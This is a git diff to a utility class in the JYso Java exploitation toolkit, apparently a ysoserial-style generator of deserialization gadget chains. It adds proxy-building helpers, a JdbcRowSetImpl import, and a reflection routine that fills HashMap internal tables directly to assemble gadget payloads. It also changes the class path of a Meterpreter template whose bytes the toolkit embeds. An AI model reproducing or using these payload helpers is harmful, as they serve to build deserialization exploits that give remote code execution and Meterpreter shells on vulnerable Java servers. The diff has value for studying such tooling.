@@ -15,12 +15,55 @@ import java.util.Random;
 import java.util.zip.Deflater;
 import java.util.zip.GZIPOutputStream;
 
+import com.sun.rowset.JdbcRowSetImpl;
+
+import java.io.InputStream;
+import java.lang.reflect.*;
+import java.util.*;
+
 import static com.qi4l.JYso.gadgets.Config.Config.*;
+import static com.qi4l.JYso.gadgets.utils.Gadgets.createMemoizedInvocationHandler;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertMethod;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler.generateClassName;
 import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.shrinkBytes;
 
 public class Utils {
+    public static Map<String, Object> createMap(final String key, final Object val) {
+        final Map<String, Object> map = new HashMap<>();
+        map.put(key, val);
+        return map;
+    }
+    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
+        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
+    }
+
+    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
+        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
+        allIfaces[0] = iface;
+        if (ifaces.length > 0) {
+            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
+        }
+        return iface.cast(Proxy.newProxyInstance(TemplatesUtil.class.getClassLoader(), allIfaces, ih));
+    }
+
+    public static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
+        HashMap<Object, Object> s = new HashMap<>();
+        Reflections.setFieldValue(s, "size", 2);
+        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        } catch (ClassNotFoundException e) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
+        Reflections.setFieldValue(s, "table", tbl);
+        return s;
+    }
 
     public static Class<?> makeClass(String clazzName) {
         ClassPool classPool = ClassPool.getDefault();
@@ -198,7 +241,7 @@ public class Utils {
 
     public static String getClassCode(Class<?> clazz) throws Exception {
         byte[] bytes;
-        if (clazz.getName().equals("com.feihong.ldap.template.Meterpreter")) {
+        if (clazz.getName().equals("com.feihong.ldap.template.com.qi4l.JYso.template.Meterpreter")) {
             bytes = ClassByteChange.update();
 
         } else {
